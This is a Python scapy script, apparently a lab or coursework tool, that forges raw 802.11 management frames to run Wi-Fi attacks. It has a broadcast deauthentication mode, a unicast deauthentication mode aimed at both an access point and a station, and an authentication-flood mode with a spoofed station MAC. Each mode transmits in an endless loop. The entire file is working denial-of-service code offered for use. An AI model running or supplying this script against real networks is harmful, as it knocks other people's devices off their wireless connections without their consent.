#!/usr/bin/sudo /usr/bin/python3

from threading import Thread
from scapy.all import sendp
import sys


argv=sys.argv

if len(argv) <3:
    print("%s <interface> <ap mac> [<station mac> [-auth]]" % argv[0])
    exit(0)

iface=argv[1]
ap_mac=argv[2]
auth_flag=False

if len(argv)>3:
    station_mac=argv[3]
    station_mac=station_mac.replace(':','')
    station_mac=bytes.fromhex(station_mac)
    if "-auth" in argv:
        auth_flag=True

class RadioTopHeader():
    def __init__(self):
        self.header_revision=b"\x00"
        self.header_pad=b"\x00"
        self.header_len=b"\x18\x00"
        self.present_flags=b"\x00"*8
        self.flags=b"\x00"
        self.data_rate=b"\x00"
        self.ch_frequency=b"\x00\x00"
        self.ch_flags=b"\x00\x00"
        self.anthenna_signal1=b"\x00\x00"
        self.rx_flags=b"\x00\x00"
        self.anthenna_signal2=b"\x00"
        self.anthenna=b"\x00"

class Frame():
    def __init__(self):
        self.type=b"\x00\x00"
        self.duration=b"\x00\x00"
        self.dst_addr=b"\x00"*6
        self.src_addr=b"\x00"*6
        self.bss=b"\x00"*6
        self.seq=b"\x00"*2


class Packet():
    def __init__(self):
        self.raw=b""
    def addFrame(self,frame):
        frame_data=vars(frame)
        for i in frame_data:
            self.raw+=frame_data[i]
    def addRaw(self,raw_data):
        self.raw+=raw_data

def sendPacket(raw,iface):
    sendp(raw,iface,loop=1,inter=0.02)

ap_mac=ap_mac.replace(':','')
ap_mac=bytes.fromhex(ap_mac)

#auth attack
if auth_flag:
    print("[*] Auth Attack")

    p=Packet()
    rt_header=RadioTopHeader()
    p.addFrame(rt_header)

    auth_frame=Frame()
    auth_frame.type=b"\xb0\x00"
    auth_frame.dst_addr=ap_mac
    auth_frame.src_addr=station_mac
    auth_frame.bss=ap_mac
    p.addFrame(auth_frame)

    p.addRaw(b"\x00\x00\x01\x00\x00\x00") #wireless mgmt
    sendPacket(p.raw,iface)

#deauth attac - AP&Station unicast
elif "station_mac" in locals():
    print("[*] Deauth Attack - AP&Station Unicast")

    p1=Packet()
    rt_header=RadioTopHeader()
    p1.addFrame(rt_header)

    deauth_APunicast_frame=Frame()
    deauth_APunicast_frame.type=b"\xc0\x00"
    deauth_APunicast_frame.dst_addr=station_mac
    deauth_APunicast_frame.src_addr=ap_mac
    deauth_APunicast_frame.bss=ap_mac
    p1.addFrame(deauth_APunicast_frame)
    
    p1.addRaw(b"\x06\x00") # wireless mgmt

    p2=Packet()
    p2.addFrame(rt_header)

    deauth_STunicast_frame=Frame()
    deauth_STunicast_frame.type=b"\xc0\x00"
    deauth_STunicast_frame.dst_addr=ap_mac
    deauth_STunicast_frame.src_addr=station_mac
    deauth_STunicast_frame.bss=ap_mac
    p2.addFrame(deauth_STunicast_frame)

    p2.addRaw(b"\x01\x00\xdd\x08\x00\x17\x35\x01\x01\x00\x00\x00") # wireless mgmt

    t1=Thread(target=sendPacket,args=(p1.raw,iface))
    t2=Thread(target=sendPacket,args=(p2.raw,iface))

    t1.start()
    t2.start()

    t1.join()
    t2.join()


#deauth attack - broadcast
else:
    print("[*] Deauth Attack - Broadcast")
    p=Packet()
    rt_header=RadioTopHeader()
    p.addFrame(rt_header)

    deauth_frame=Frame()
    deauth_frame.type=b"\xc0\x00"
    deauth_frame.dst_addr=b"\xff\xff\xff\xff\xff\xff"
    deauth_frame.src_addr=ap_mac
    deauth_frame.bss=ap_mac

    p.addFrame(deauth_frame)
    p.addRaw(b"\x03\x00") #wireless mgmt
    sendPacket(p.raw,iface)


